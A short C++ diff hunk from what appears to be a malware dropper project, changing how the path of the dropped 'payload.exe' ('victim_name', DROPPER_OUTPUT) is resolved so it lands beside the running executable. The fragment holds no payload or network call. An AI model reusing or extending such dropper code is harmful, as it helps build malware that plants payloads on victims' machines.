@@ -61,16 +61,17 @@ void set_name();
 // global: final binary name
 char name[10 * NAME_SIZE];
 
-// (char*) C:\\example\\path\\to\\your\\payload.exe
-std::string absolute_victim_name;
-
 char* victim_name = new char[100];
 
 // Entry Point
 int main(int argc, char* argv[])
 {
 	// (char*) C:\\example\\path\\to\\your\\payload.exe
-	std::string absolute_victim_name = std::filesystem::absolute(DROPPER_OUTPUT).string();
+	std::filesystem::path absolute_victim_path1 = std::filesystem::canonical(argv[0]).parent_path();
+
+	std::filesystem::path absolute_victim_name2 = absolute_victim_path1 / DROPPER_OUTPUT;
+
+	std::string absolute_victim_name = absolute_victim_name2.string();
 
 	victim_name = new char[absolute_victim_name.size() + 1];
 
